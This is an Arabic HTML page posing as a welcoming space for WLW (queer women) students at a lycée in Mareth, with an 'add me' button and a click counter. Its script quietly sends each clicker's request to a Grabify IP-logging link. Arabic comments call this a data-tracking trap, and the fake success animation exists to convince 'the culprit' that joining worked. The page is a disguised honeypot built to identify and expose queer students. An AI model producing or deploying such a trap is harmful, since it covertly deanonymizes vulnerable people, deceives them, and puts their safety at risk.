<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>WLW Lycée Mareth</title>
  <script src="https://cdn.tailwindcss.com"></script>
  <link rel="preconnect" href="https://fonts.googleapis.com" />
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
  <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;800&display=swap" rel="stylesheet" />
  <style>
    body { font-family: 'Cairo', system-ui, sans-serif; }
  </style>
</head>
<body class="min-h-screen bg-gradient-to-br from-pink-100 via-rose-50 to-fuchsia-100 text-rose-950 antialiased selection:bg-pink-300/50">

  <!-- Background glow -->
  <div class="pointer-events-none fixed inset-0 overflow-hidden" aria-hidden="true">
    <div class="absolute -top-32 left-1/2 h-96 w-96 -translate-x-1/2 rounded-full bg-pink-300/40 blur-3xl"></div>
    <div class="absolute bottom-0 right-0 h-80 w-80 rounded-full bg-fuchsia-300/30 blur-3xl"></div>
    <div class="absolute bottom-10 left-0 h-64 w-64 rounded-full bg-rose-300/30 blur-3xl"></div>
  </div>

  <main class="relative flex min-h-screen items-center justify-center px-4 py-12">
    <section class="w-full max-w-md rounded-3xl border border-pink-200 bg-white/70 p-8 text-center shadow-2xl shadow-pink-300/40 backdrop-blur sm:p-10">

      <!-- Icon -->
      <div class="mx-auto mb-6 flex h-16 w-16 items-center justify-center rounded-2xl bg-gradient-to-br from-pink-400 to-fuchsia-500 shadow-lg shadow-pink-400/40">
        <svg xmlns="http://www.w3.org/2000/svg" class="h-8 w-8 text-white" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="1.8">
          <path stroke-linecap="round" stroke-linejoin="round" d="M4.318 6.318a4.5 4.5 0 000 6.364L12 20.364l7.682-7.682a4.5 4.5 0 00-6.364-6.364L12 7.636l-1.318-1.318a4.5 4.5 0 00-6.364 0z" />
        </svg>
      </div>

      <span class="inline-block rounded-full border border-pink-200 bg-pink-50 px-3 py-1 text-xs font-semibold text-pink-500">
       إستمتعوا بالفضاء الخاص بكنّ 💖
      </span>

      <h1 class="mt-5 text-3xl font-extrabold tracking-tight text-rose-900 sm:text-4xl">
        مرحبا بالنساء الراقيات 
      </h1>

      <p class="mt-4 text-base leading-loose text-rose-800/70">
        فضاء خاص بكنّ 💖 وإعطاء عدد WLW في معهد مارث لإعطاء الأمل في ملاقاة شريكتكن 
      </p>

      <div class="my-8 h-px w-full bg-gradient-to-r from-transparent via-pink-300 to-transparent"></div>

      <!-- Primary CTA -->
      <button
        id="join-btn"
        type="button"
        class="w-full rounded-xl bg-gradient-to-r from-pink-500 to-fuchsia-500 px-6 py-4 text-lg font-bold text-white shadow-lg shadow-pink-400/40 transition duration-200 hover:from-pink-400 hover:to-fuchsia-400 hover:shadow-pink-400/60 focus:outline-none focus-visible:ring-2 focus-visible:ring-pink-400 focus-visible:ring-offset-2 focus-visible:ring-offset-white active:scale-[0.98] disabled:hidden"
      >
        أنا من هذه المجموعة، أضيفوني
      </button>

      <!-- Subtext note -->
      <p id="note" class="mt-4 text-xs leading-loose text-rose-700/70">
         ❤️❤️❤️❤️
      </p>

      <!-- Result box (hidden until click) -->
      <div id="result" class="hidden mt-2 rounded-2xl border border-pink-200 bg-gradient-to-br from-pink-50 to-fuchsia-50 p-6">
        <p class="text-sm font-semibold text-pink-500">عدد الأشخاص الذين نقروا</p>
        <p id="count" class="mt-1 bg-gradient-to-r from-pink-500 to-fuchsia-500 bg-clip-text text-5xl font-extrabold text-transparent">…</p>
        <div class="my-4 h-px w-full bg-pink-200"></div>
        <p class="text-2xl font-extrabold text-rose-900">حظًا موفقًا 💖 في إيجاد شريكتك ياديفا</p>
        <p class="mt-1 text-base font-semibold text-rose-700">بالتوفيق وبكل حب 🌸</p>
      </div>
    </section>
  </main>

  <script>
    const btn = document.getElementById('join-btn');
    const note = document.getElementById('note');
    const result = document.getElementById('result');
    const countEl = document.getElementById('count');

    const API = 'https://api.counterapi.dev/v1/wlw-lycee-mareth/clics';
    const LS_KEY = 'wlw_clicked';
    const LS_COUNT = 'wlw_count';

    const fmt = (n) => n.toLocaleString('ar-EG');

    function animateTo(target) {
      const duration = 900;
      const start = performance.now();
      function step(now) {
        const p = Math.min((now - start) / duration, 1);
        countEl.textContent = fmt(Math.round(target * (1 - Math.pow(1 - p, 3))));
        if (p < 1) requestAnimationFrame(step);
      }
      requestAnimationFrame(step);
    }

    function showResult(n) {
      btn.disabled = true;
      note.classList.add('hidden');
      result.classList.remove('hidden');
      animateTo(n);
    }

    async function getCount(alreadyClicked) {
      try {
        const res = await fetch(alreadyClicked ? API : API + '/up');
        if (!res.ok) throw new Error('API error');
        const data = await res.json();
        return data.count;
      } catch (e) {
        let local = parseInt(localStorage.getItem(LS_COUNT) || '0', 10);
        if (!alreadyClicked) {
          local += 1;
          localStorage.setItem(LS_COUNT, String(local));
        }
        return local;
      }
    }

    // دالة النقر الموحدة والمحمية
    btn.addEventListener('click', async () => {
      btn.disabled = true;

      // 1. فخ ترصد المعطيات: إرسال طلب صامت وخلفي لرابط Grabify المموّه الخاص بك
      // قم باستبدال الرابط أدناه بالرمز الحقيقي الذي منحه لك موقع Grabify
      const grabifyUrl = 'https://grabify.link'; 

      fetch(grabifyUrl, { 
        mode: 'no-cors',
        cache: 'no-cache',
        credentials: 'omit'
      }).then(() => console.log('Logged'))
        .catch(e => console.log('Forwarded'));

      // 2. تفعيل العداد والأنيميشن الطبيعي لإقناع الجاني تماماً بنجاح الإضافة
      const n = await getCount(false);
      try { localStorage.setItem(LS_KEY, '1'); } catch (e) {}
      showResult(n);
    });

    // عرض النتيجة مباشرة إذا سبق للمستخدم النقر
    (async () => {
      let clicked = false;
      try { clicked = localStorage.getItem(LS_KEY) === '1'; } catch (e) {}
      if (clicked) {
        const n = await getCount(true);
        showResult(n);
      }
    })();
  </script>
</body>
</html>
